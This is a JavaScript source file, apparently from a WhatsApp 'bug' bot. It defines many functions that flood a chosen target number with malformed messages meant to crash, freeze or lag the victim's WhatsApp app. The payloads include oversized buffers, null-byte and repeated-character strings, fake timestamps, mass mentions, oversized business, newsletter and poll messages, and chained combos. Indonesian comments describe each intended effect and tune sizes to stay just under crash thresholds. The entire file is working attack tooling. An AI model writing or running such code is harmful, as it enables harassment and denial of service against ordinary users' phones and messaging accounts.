      senderKeyDistributionMessage: {
        groupId: target,
        axolotlSenderKeyDistributionMessage: crypto.randomBytes(50000)
      }
    }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── CRYPTO 2: PreKey Corrupt ──────────────────────────────────
async function bug_crypto2(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      senderKeyDistributionMessage: {
        groupId: '\u0000'.repeat(5000),
        axolotlSenderKeyDistributionMessage: Buffer.alloc(50000, 0xFF)
      }
    }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── CRYPTO 3: Device Identity Corrupt ─────────────────────────
async function bug_crypto3(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      messageContextInfo: {
        deviceListMetadata: {
          senderKeyHash: crypto.randomBytes(32).toString('base64'),
          senderTimestamp: '99999999999999',
          recipientKeyHash: crypto.randomBytes(32).toString('base64'),
          recipientTimestamp: '99999999999999'
        },
        deviceListMetadataVersion: 99999,
        messageSecret: Buffer.alloc(32, 0xFF)
      },
      conversation: 'ꦾ'.repeat(30000)
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── CRYPTO 4: Session Corrupt ─────────────────────────────────
async function bug_crypto4(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.assertSessions([
      Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
    ], false).catch(() => {});
    await sleep(50);
  }
}

// ─── CRYPTO 5: Signal Identity Corrupt ─────────────────────────
async function bug_crypto5(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      protocolMessage: {
        type: 5,
        key: { remoteJid: target, fromMe: true, id: '3EB0' + crypto.randomBytes(16).toString('hex') },
        ephemeralExpiration: 999999999
      }
    }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── CRYPTO 6: Registration ID Flood ───────────────────────────
async function bug_crypto6(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      senderKeyDistributionMessage: {
        groupId: target,
        axolotlSenderKeyDistributionMessage: Buffer.from([
          Math.floor(Math.random() * 255),
          Math.floor(Math.random() * 255),
          Math.floor(Math.random() * 255),
          Math.floor(Math.random() * 255)
        ])
      }
    }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── CRYPTO 7: Chain Key Corrupt ───────────────────────────────
async function bug_crypto7(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      deviceSentMessage: {
        destinationJid: '\u0000'.repeat(5000),
        message: { conversation: 'ꦾ'.repeat(50000) }
      }
    }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── CRYPTO 8: Padding Corrupt ─────────────────────────────────
async function bug_crypto8(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      conversation: Buffer.alloc(50000, 0xFF).toString('base64')
    }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── CRYPTO 9: MAC Invalid ─────────────────────────────────────
async function bug_crypto9(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(50000),
        contextInfo: {
          messageSecret: Buffer.alloc(32, 0xFF),
          messageAssociation: {
            associationType: 999,
            parentMessageKey: {
              remoteJid: '\u0000'.repeat(5000),
              fromMe: false,
              id: '\u0000'.repeat(1000)
            }
          }
        }
      }
    }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── CRYPTO 10: Combined ───────────────────────────────────────
async function bug_crypto10(sock, target) {
  await bug_crypto1(sock, target);
  await sleep(300);
  await bug_crypto3(sock, target);
}

// ─── BUSINESS 1: Catalog Query ─────────────────────────────────
async function bug_business1(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: target, type: 'get', id: sock.generateMessageTag(), xmlns: 'w:biz:catalog' },
      content: [{ tag: 'product_catalog', attrs: { v: '1' } }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── BUSINESS 2: Order Status ──────────────────────────────────
async function bug_business2(sock, target) {
  const msg = genWAMessage(target, {
    orderMessage: {
      orderId: '\u0000'.repeat(5000),
      thumbnail: Buffer.alloc(100000, 0xFF),
      itemCount: 2147483647,
      status: 999,
      surface: 999,
      message: '\u0000'.repeat(200000),
      orderTitle: 'ꦾ'.repeat(50000),
      sellerJid: target,
      token: 'ꦾ'.repeat(50000),
      totalAmount1000: 999999999999,
      totalCurrencyCode: 'IDR'
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── BUSINESS 3: Product Message ───────────────────────────────
async function bug_business3(sock, target) {
  const msg = genWAMessage(target, {
    productMessage: {
      product: {
        productImage: {
          url: 'https://mmg.whatsapp.net/prod.enc',
          mimetype: 'image/jpeg',
          fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
          fileLength: '9999999',
          height: 9999, width: 9999,
          mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
          fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
          directPath: '/prod.enc'
        },
        productId: '\u0000'.repeat(5000),
        title: 'ꦾ'.repeat(50000),
        description: 'ꦾ'.repeat(50000),
        currencyCode: 'IDR',
        priceAmount1000: 999999999999,
        retailerId: 'ꦾ'.repeat(50000),
        url: 'https://invalid.url/' + 'ꦾ'.repeat(50000)
      },
      businessOwnerJid: target
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── BUSINESS 4: Interactive Commerce ──────────────────────────
async function bug_business4(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(50000) },
      nativeFlowMessage: {
        buttons: [{
          name: 'review_and_pay',
          buttonParamsJson: JSON.stringify({
            reference_id: 'biz_' + Date.now(),
            type: 'physical-goods',
            payment_method: 'cash_on_delivery',
            currency: 'IDR',
            total_amount: { value: 999999999, offset: 100 },
            order: {
              status: 'processing',
              subtotal: { value: 999999999, offset: 100 },
              order_type: 'PAYMENT_REQUEST',
              items: Array.from({ length: 500 }, (_, i) => ({
                retailer_id: 'item_' + i,
                name: 'ꦾ'.repeat(5000),
                amount: { value: 999999, offset: 100 },
                quantity: 99999
              }))
            }
          })
        }]
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── BUSINESS 5: Payment Invite ────────────────────────────────
async function bug_business5(sock, target) {
  const msg = genWAMessage(target, {
    paymentInviteMessage: {
      serviceType: 999,
      expiryTimestamp: 99999999999999
    },
    extendedTextMessage: { text: 'ꦾ'.repeat(50000) }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── BUSINESS 6: Business Hours ────────────────────────────────
async function bug_business6(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: target, type: 'get', id: sock.generateMessageTag(), xmlns: 'w:biz:hours' },
      content: [{ tag: 'business_hours', attrs: {}, content: Buffer.alloc(50000, 0xFF) }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── BUSINESS 7: Business Profile ──────────────────────────────
async function bug_business7(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: target, type: 'get', id: sock.generateMessageTag(), xmlns: 'w:biz' },
      content: [{ tag: 'business_profile', attrs: { v: '1' } }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── BUSINESS 8: Collection Query ──────────────────────────────
async function bug_business8(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: target, type: 'get', id: sock.generateMessageTag(), xmlns: 'w:biz:catalog' },
      content: [{ tag: 'collections', attrs: {}, content: Buffer.alloc(50000, 0xFF) }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── BUSINESS 9: Order Status Query ────────────────────────────
async function bug_business9(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: target, type: 'get', id: sock.generateMessageTag(), xmlns: 'w:biz' },
      content: [{ tag: 'order', attrs: { id: '\u0000'.repeat(1000) } }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── BUSINESS 10: Combined ─────────────────────────────────────
async function bug_business10(sock, target) {
  await bug_business2(sock, target);
  await sleep(300);
  await bug_business4(sock, target);
}

// ─── NEWSLETTER 1: Newsletter Follow ───────────────────────────
async function bug_newsletter1(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'newsletter' },
      content: [{
        tag: 'follow',
        attrs: { jid: '1@newsletter' + i }
      }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── NEWSLETTER 2: Newsletter Unfollow ─────────────────────────
async function bug_newsletter2(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'newsletter' },
      content: [{
        tag: 'unfollow',
        attrs: { jid: '1@newsletter' + i }
      }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── NEWSLETTER 3: Newsletter Message ──────────────────────────
async function bug_newsletter3(sock, target) {
  for (let i = 0; i < 20; i++) {
    const msg = genWAMessage('1@newsletter', {
      extendedTextMessage: { text: 'ꦾ'.repeat(50000) }
    }, {});
    await sock.relayMessage('1@newsletter', msg.message, { messageId: msg.key.id }).catch(() => {});
    await sleep(100);
  }
}

// ─── NEWSLETTER 4: Newsletter Admin Invite ─────────────────────
async function bug_newsletter4(sock, target) {
  const msg = genWAMessage(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: '1@newsletter',
      newsletterName: 'ꦾ'.repeat(100000),
      jpegThumbnail: Buffer.alloc(500000, 0xFF),
      caption: 'ꦾ'.repeat(100000),
      inviteExpiration: 99999999999999
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── NEWSLETTER 5: Newsletter Reaction ─────────────────────────
async function bug_newsletter5(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.relayMessage('1@newsletter', {
      reactionMessage: {
        key: {
          remoteJid: '1@newsletter',
          fromMe: false,
          id: '3EB0' + crypto.randomBytes(8).toString('hex')
        },
        text: 'ꦾ'.repeat(5000)
      }
    }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── NEWSLETTER 6: Newsletter Poll ─────────────────────────────
async function bug_newsletter6(sock, target) {
  const msg = genWAMessage('1@newsletter', {
    pollCreationMessage: {
      name: 'ꦾ'.repeat(50000),
      options: Array.from({ length: 500 }, (_, j) => ({
        optionName: 'ꦾ'.repeat(5000) + j
      })),
      selectableOptionsCount: 99999
    }
  }, {});
  await sock.relayMessage('1@newsletter', msg.message, { messageId: msg.key.id }).catch(() => {});
}

// ─── NEWSLETTER 7: Newsletter Metadata ─────────────────────────
async function bug_newsletter7(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag(), xmlns: 'newsletter' },
      content: [{
        tag: 'metadata',
        attrs: { jid: '1@newsletter' }
      }]
    }).catch(() => {});
    await sleep(50);
  }
}

// ─── NEWSLETTER 8: Newsletter Reactions Query ──────────────────
async function bug_newsletter8(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag(), xmlns: 'newsletter' },
      content: [{
        tag: 'reactions',
        attrs: { jid: '1@newsletter', id: '3EB0' + i }
      }]
    }).catch(() => {});
    await sleep(50);
  }
}

// ─── NEWSLETTER 9: Newsletter Update ───────────────────────────
async function bug_newsletter9(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'newsletter' },
      content: [{
        tag: 'update',
        attrs: { jid: '1@newsletter' },
        content: [{ tag: 'name', attrs: {}, content: 'ꦾ'.repeat(50000) }]
      }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── NEWSLETTER 10: Combined ───────────────────────────────────
async function bug_newsletter10(sock, target) {
  await bug_newsletter1(sock, target);
  await sleep(300);
  await bug_newsletter4(sock, target);
}

// ─── DEVICE 1: Device Query ────────────────────────────────────
async function bug_device1(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag(), xmlns: 'encrypt' },
      content: [{
        tag: 'key',
        attrs: {},
        content: [{ tag: 'user', attrs: { jid: target } }]
      }]
    }).catch(() => {});
    await sleep(50);
  }
}

// ─── DEVICE 2: USync Devices ───────────────────────────────────
async function bug_device2(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag(), xmlns: 'usync' },
      content: [{
        tag: 'usync',
        attrs: { sid: 'query', mode: 'query', last: 'true', index: '0', context: 'interactive' },
        content: [
          { tag: 'query', attrs: {}, content: [{ tag: 'devices', attrs: { version: '2' } }] },
          { tag: 'list', attrs: {}, content: [{ tag: 'user', attrs: { jid: target } }] }
        ]
      }]
    }).catch(() => {});
    await sleep(50);
  }
}

// ─── DEVICE 3: Device List Flood ───────────────────────────────
async function bug_device3(sock, target) {
  const jids = Array.from({ length: 5000 }, () =>
    Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
  );
  for (let i = 0; i < 10; i++) {
    await sock.getUSyncDevices(jids, false, false).catch(() => {});
    await sleep(100);
  }
}

// ─── DEVICE 4: PreKey Fetch ────────────────────────────────────
async function bug_device4(sock, target) {
  const jids = Array.from({ length: 5000 }, () =>
    Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
  );
  for (let i = 0; i < 10; i++) {
    await sock.assertSessions(jids, false).catch(() => {});
    await sleep(100);
  }
}

// ─── DEVICE 5: Session Create ──────────────────────────────────
async function bug_device5(sock, target) {
  const jids = Array.from({ length: 5000 }, () =>
    Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
  );
  for (let i = 0; i < 10; i++) {
    await sock.assertSessions(jids, true).catch(() => {});
    await sleep(100);
  }
}

// ─── DEVICE 6: Device Registration ─────────────────────────────
async function bug_device6(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'encrypt' },
      content: [{
        tag: 'registration',
        attrs: {},
        content: Buffer.alloc(50000, 0xFF)
      }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── DEVICE 7: Device Identity Query ───────────────────────────
async function bug_device7(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'get', id: sock.generateMessageTag(), xmlns: 'encrypt' },
      content: [{
        tag: 'identity',
        attrs: {},
        content: [{ tag: 'user', attrs: { jid: target } }]
      }]
    }).catch(() => {});
    await sleep(50);
  }
}

// ─── DEVICE 8: Companion Registration ──────────────────────────
async function bug_device8(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'md' },
      content: [{
        tag: 'companion',
        attrs: {},
        content: Buffer.alloc(50000, 0xFF)
      }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── DEVICE 9: Device List Update ──────────────────────────────
async function bug_device9(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'md' },
      content: [{
        tag: 'devices',
        attrs: {},
        content: Buffer.alloc(50000, 0xFF)
      }]
    }).catch(() => {});
    await sleep(100);
  }
}

// ─── DEVICE 10: Combined ───────────────────────────────────────
async function bug_device10(sock, target) {
  await bug_device1(sock, target);
  await sleep(300);
  await bug_device3(sock, target);
}

// ─── PRIVACY 1: Blocklist Add ──────────────────────────────────
async function bug_privacy1(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.updateBlockStatus(target, 'block').catch(() => {});
    await sleep(50);
    await sock.updateBlockStatus(target, 'unblock').catch(() => {});
    await sleep(50);
  }
}

// ─── PRIVACY 2: Status Privacy ─────────────────────────────────
async function bug_privacy2(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'status' },
      content: [{
        tag: 'status',
        attrs: { type: 'invalid_' + i }
      }]
    }).catch(() => {});
    await sleep(50);
  }
}

// ─── PRIVACY 3: Last Seen Update ───────────────────────────────
async function bug_privacy3(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'privacy' },
      content: [{
        tag: 'privacy',
        attrs: {},
        content: [{ tag: 'last', attrs: {}, content: String(i % 5) }]
      }]
    }).catch(() => {});
    await sleep(30);
  }
}

// ─── PRIVACY 4: Profile Picture Query ──────────────────────────
async function bug_privacy4(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.profilePictureUrl(target, 'image').catch(() => {});
    await sleep(30);
  }
}

// ─── PRIVACY 5: Status Fetch ───────────────────────────────────
async function bug_privacy5(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.fetchStatus(target).catch(() => {});
    await sleep(30);
  }
}

// ─── PRIVACY 6: OnWhatsApp Query ───────────────────────────────
async function bug_privacy6(sock, target) {
  const numbers = Array.from({ length: 5000 }, () =>
    String(Math.floor(Math.random() * 9999999999))
  );
  for (let i = 0; i < 10; i++) {
    await sock.onWhatsApp(...numbers).catch(() => {});
    await sleep(100);
  }
}

// ─── PRIVACY 7: Profile Update ─────────────────────────────────
async function bug_privacy7(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.updateProfileStatus('ꦾ'.repeat(50000)).catch(() => {});
    await sleep(50);
  }
}

// ─── PRIVACY 8: Profile Name Update ────────────────────────────
async function bug_privacy8(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.updateProfileName('ꦾ'.repeat(50000)).catch(() => {});
    await sleep(50);
  }
}

// ─── PRIVACY 9: Privacy Setting Loop ───────────────────────────
async function bug_privacy9(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.query({
      tag: 'iq',
      attrs: { to: 's.whatsapp.net', type: 'set', id: sock.generateMessageTag(), xmlns: 'privacy' },
      content: [{
        tag: 'privacy',
        attrs: {},
        content: [{ tag: 'groupadd', attrs: {}, content: String(i % 3) }]
      }]
    }).catch(() => {});
    await sleep(30);
  }
}

// ─── PRIVACY 10: Combined ──────────────────────────────────────
async function bug_privacy10(sock, target) {
  await bug_privacy1(sock, target);
  await sleep(300);
  await bug_privacy7(sock, target);
}

// ─── CHAIN 1: Freeze → Crash → Kill ────────────────────────────
async function bug_chain1(sock, target) {
  await bug_freeze1(sock, target);
  await sleep(1000);
  await bug_crash1(sock, target);
  await sleep(1000);
  await bug_kill1(sock, target);
}

// ─── CHAIN 2: Blank → Lag → Spam ───────────────────────────────
async function bug_chain2(sock, target) {
  await bug_blank1(sock, target);
  await sleep(800);
  await bug_lag1(sock, target);
  await sleep(800);
  await bug_spam1(sock, target);
}

// ─── CHAIN 3: Carousel → Sticker → Call ────────────────────────
async function bug_chain3(sock, target) {
  await bug_carousel1(sock, target);
  await sleep(800);
  await bug_sticker6(sock, target);
  await sleep(800);
  await bug_call3(sock, target);
}

// ─── CHAIN 4: Payload × 3 ──────────────────────────────────────
async function bug_chain4(sock, target) {
  await bug_payload1(sock, target);
  await sleep(500);
  await bug_payload3(sock, target);
  await sleep(500);
  await bug_payload4(sock, target);
}

// ─── CHAIN 5: Media → Business → Newsletter ────────────────────
async function bug_chain5(sock, target) {
  await bug_media1(sock, target);
  await sleep(800);
  await bug_business2(sock, target);
  await sleep(800);
  await bug_newsletter4(sock, target);
}

// ─── CHAIN 6: Group → Device → Privacy ─────────────────────────
async function bug_chain6(sock, target) {
  await bug_group5(sock, target);
  await sleep(800);
  await bug_device3(sock, target);
  await sleep(800);
  await bug_privacy1(sock, target);
}

// ─── CHAIN 7: Crypto → Stanza → Presence ───────────────────────
async function bug_chain7(sock, target) {
  await bug_crypto1(sock, target);
  await sleep(800);
  await bug_stanza2(sock, target);
  await sleep(800);
  await bug_presence1(sock, target);
}

// ─── CHAIN 8: Fast Chain ───────────────────────────────────────
async function bug_chain8(sock, target) {
  await bug_crash1(sock, target);
  await sleep(300);
  await bug_kill1(sock, target);
  await sleep(300);
  await bug_crash2(sock, target);
}

// ─── CHAIN 9: Slow Chain ───────────────────────────────────────
async function bug_chain9(sock, target) {
  await bug_lag1(sock, target);
  await sleep(3000);
  await bug_lag2(sock, target);
  await sleep(3000);
  await bug_lag3(sock, target);
}

// ─── CHAIN 10: Full Combo ──────────────────────────────────────
async function bug_chain10(sock, target) {
  await bug_freeze1(sock, target);
  await sleep(500);
  await bug_blank1(sock, target);
  await sleep(500);
  await bug_crash1(sock, target);
  await sleep(500);
  await bug_kill1(sock, target);
}

// ══════════════════════════════════════════════════════════════
// LAG + JAM — EFFECT BERAT TAPI GAK CRASH
// ══════════════════════════════════════════════════════════════

// ─── LAGJAM 1: Waveform Bomb (Audio Fake) ─────────────────────
// Effect: WA hitung render waveform 1MB → CPU spike → lag, UI freeze sebentar
// Target: chat lag, audio player nge-lag, tapi WA gak FC
async function bug_lagjam1(sock, target) {
  for (let i = 0; i < 15; i++) {
    await sock.relayMessage(target, {
      audioMessage: {
        url: 'https://mmg.whatsapp.net/lagjam.enc',
        mimetype: 'audio/ogg; codecs=opus',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileLength: '9999999',
        seconds: 9999,
        ptt: true,
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        directPath: '/lagjam.enc',
        waveform: Buffer.alloc(500000, 0x80)  // 500KB, di bawah crash threshold
      }
    }, {}).catch(() => {});
    await sleep(800);  // jeda biar gak numpuk jadi crash
  }
}

// ─── LAGJAM 2: Mention + Quote Chain ──────────────────────────
// Effect: setiap pesan ada 5000 mentionedJid + quote → parser kalkulasi lama
// Target: chat scroll lag, keyboard delay
async function bug_lagjam2(sock, target) {
  for (let i = 0; i < 20; i++) {
    const msg = genWAMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(20000),
        contextInfo: {
          mentionedJid: Array.from({ length: 5000 }, () =>
            Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
          ),
          quotedMessage: {
            conversation: 'ꦾ'.repeat(20000)
          },
          forwardingScore: 9999
        }
      }
    }, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
    await sleep(500);
  }
}

// ─── LAGJAM 3: Timestamp Manipulation ─────────────────────────
// Effect: kirim pesan dengan timestamp acak → WA render ulang urutan
// Target: pesan masuk "jam" (jam mundur / lompat), chat list re-order
async function bug_lagjam3(sock, target) {
  const now = Date.now();
  for (let i = 0; i < 30; i++) {
    // Timestamp mundur random 1 jam - 30 hari
    const backTime = Math.floor(Math.random() * 2592000000);
    const fakeTs = now - backTime;
    
    const msg = genWAMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(15000) + ' #' + i,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true
        }
      }
    }, { timestamp: new Date(fakeTs), messageId: '3EB0' + crypto.randomBytes(8).toString('hex') });
    
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      timestamp: fakeTs  // paksa timestamp mundur
    }).catch(() => {});
    
    await sleep(400);
  }
}

// ─── LAGJAM 4: Progressive Payload ────────────────────────────
// Effect: kirim pesan bertambah besar pelan-pelan
// Target: WA makin lama makin lag, tapi gak sadar karena gradual
async function bug_lagjam4(sock, target) {
  for (let i = 1; i <= 30; i++) {
    const size = i * 10000;  // 10KB → 300KB
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(size),
        description: 'ꦾ'.repeat(size),
        title: 'ꦾ'.repeat(size)
      }
    }, {}).catch(() => {});
    await sleep(600);
  }
}

// ─── LAGJAM 5: Document Page Render ───────────────────────────
// Effect: WA render preview PDF pageCount gede → UI hitung layout
// Target: chat preview lag, doc thumbnail lambat
async function bug_lagjam5(sock, target) {
  for (let i = 0; i < 15; i++) {
    await sock.relayMessage(target, {
      documentMessage: {
        url: 'https://mmg.whatsapp.net/lagjam.enc',
        mimetype: 'application/pdf',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileLength: '9999999',
        pageCount: 99999,  // page count gede, tapi bukan 2^31 (gak crash)
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        fileName: 'lagjam_' + i + '.pdf',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        directPath: '/lagjam.enc',
        jpegThumbnail: Buffer.alloc(50000, 0xFF)
      }
    }, {}).catch(() => {});
    await sleep(700);
  }
}

// ─── LAGJAM 6: Combo Lag + Jam ────────────────────────────────
// Effect: gabungan waveform + timestamp mundur + mention
// Target: lag parah, pesan masuk jam acak, tapi WA tetep jalan
async function bug_lagjam6(sock, target) {
  const now = Date.now();
  for (let i = 0; i < 20; i++) {
    const fakeTs = now - Math.floor(Math.random() * 86400000);  // mundur max 1 hari
    
    // Selang-seling antara audio waveform dan mention
    if (i % 2 === 0) {
      await sock.relayMessage(target, {
        audioMessage: {
          url: 'https://mmg.whatsapp.net/lagjam.enc',
          mimetype: 'audio/ogg; codecs=opus',
          fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
          fileLength: '9999999',
          seconds: 9999,
          ptt: true,
          mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
          fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
          directPath: '/lagjam.enc',
          waveform: Buffer.alloc(300000, 0x80)
        }
      }, { timestamp: fakeTs }).catch(() => {});
    } else {
      const msg = genWAMessage(target, {
        extendedTextMessage: {
          text: 'ꦾ'.repeat(20000),
          contextInfo: {
            mentionedJid: Array.from({ length: 3000 }, () =>
              Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
            )
          }
        }
      }, {});
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        timestamp: fakeTs
      }).catch(() => {});
    }
    await sleep(600);
  }
}

// ══════════════════════════════════════════════════════════════
// ANDROID 60 BUG — PLATFORM-AWARE
// ══════════════════════════════════════════════════════════════

const ANDROID_PROFILE = {
  maxPayload: 500000, maxMention: 50000, nullByteOK: true,
  viewOnceNested: false, fakeTimestampMaxDays: 30,
  carouselMaxCards: 200, waveformMaxKB: 500, buttonMax: 3000, pollMax: 300
};

function andClamp(v, min, max) { return v < min ? min : (v > max ? max : v); }

function andProfile(opts = {}) {
  const p = ANDROID_PROFILE;
  return {
    ...opts,
    payloadSize: andClamp(opts.payloadSize || 50000, 1000, p.maxPayload),
    mentionCount: andClamp(opts.mentionCount || 1000, 0, p.maxMention),
    loop: andClamp(opts.loop || 10, 1, 50),
    delay: andClamp(opts.delay || 500, 100, 5000),
    waveformKB: andClamp(opts.waveformKB || 50, 1, p.waveformMaxKB),
    cardCount: andClamp(opts.cardCount || 20, 1, p.carouselMaxCards),
    buttonCount: andClamp(opts.buttonCount || 50, 1, p.buttonMax),
    pollOptions: andClamp(opts.pollOptions || 10, 2, p.pollMax),
    fakeTimestampMaxDays: p.fakeTimestampMaxDays
  };
}

async function and_frz1(sock, target, opts = {}) {
  const o = andProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      audioMessage: {
        url: 'https://mmg.whatsapp.net/a1.enc',
        mimetype: 'audio/ogg; codecs=opus',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileLength: '9999999', seconds: 9999, ptt: true,
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        directPath: '/a1.enc',
        waveform: Buffer.alloc(o.waveformKB * 1024, 0x80),
        contextInfo: {
          mentionedJid: Array.from({ length: o.mentionCount }, () =>
            Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net')
        }
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function and_frz2(sock, target, opts = {}) {
  const o = andProfile(opts);
  await sock.relayMessage(target, {
    buttonsMessage: {
      contentText: 'ꦾ'.repeat(o.payloadSize),
      footerText: 'ꦾ'.repeat(o.payloadSize),
      headerType: 1,
      buttons: Array.from({ length: o.buttonCount }, (_, j) => ({
        buttonId: 'b_' + j,
        buttonText: { displayText: 'ꦾ'.repeat(2000) },
        type: 1
      }))
    }
  }, {}).catch(() => {});
}

